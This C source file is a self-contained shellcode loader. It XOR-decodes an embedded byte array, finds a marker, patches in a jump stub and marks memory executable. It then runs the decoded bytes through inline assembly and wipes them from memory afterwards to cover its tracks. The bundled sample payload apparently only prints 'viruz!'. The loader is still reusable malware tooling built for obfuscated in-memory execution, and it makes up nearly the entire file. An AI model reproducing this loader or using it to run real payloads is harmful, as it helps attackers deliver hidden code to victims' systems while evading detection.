#include "mem.h"
#include "cpu.h"

#define XOR_BYTE 0x539

int loader_exec(byte *input_feed, size_t size) {
    byte decoded[size];
    byte prologue[] = { 0x58, 0xff, 0xe0 };
    loader_memset(decoded, 0, size);

    for (size_t i = 0; i < size; i++) {
        decoded[i] = (byte) (*(input_feed + i) ^ XOR_BYTE);
    }

    /* find shellcode magic */
    void *exec_end = find_ill(decoded, size);

    if (NULL == exec_end) {
        /* no shellcode magic */
        return EXIT_FAILURE;
    }

    loader_memcpy(exec_end, prologue, sizeof(prologue));
    __asm__ volatile (
        ".intel_syntax noprefix;"
        "lea rax, [rip+0x3];"   /* should land at nop */
        "push rax;"
        "call %[decoded_func];"
        "nop;"
        ".att_syntax;"
        :
        : [decoded_func] "r" (decoded)
        : "rax"
    );

    /* delete shellcode from memory */
    loader_memset(decoded, 0, size);

    return EXIT_SUCCESS;
}

#ifndef LOADER_LIB
int _start(void) {
    /* shellcode (example prints "viruz!") */
    byte exec[] = { 0x53, 0x38, 0x53, 0x38, 0x53, 0x3e, 0x63, 0x61, 0x66, 0x71, 0xb4, 0x0c, 0x3a, 0x39, 0x39, 0x39, 0xd2, 0x30, 0xf5, 0x4f, 0x50, 0x4b, 0x4c, 0x43, 0x18, 0x33, 0x39, 0x36, 0x3c, 0xa9, 0x36, 0x32, 0xa9, 0x36, 0x32 };
    
    if (mem_set_rwx(exec, sizeof(exec)) != EXIT_SUCCESS) {
        /* sys_mprotect failure */
        ASM_TRAP;
    }

    if (loader_exec(exec, sizeof(exec)) != EXIT_SUCCESS) {
        /* no shellcode magic */
        ASM_TRAP;
    }

    /* .. additional code .. */
    char str[] = "[+] Execution finished\n";
    loader_print(1, str, sizeof(str));

    loader_exit(EXIT_SUCCESS);
}
#endif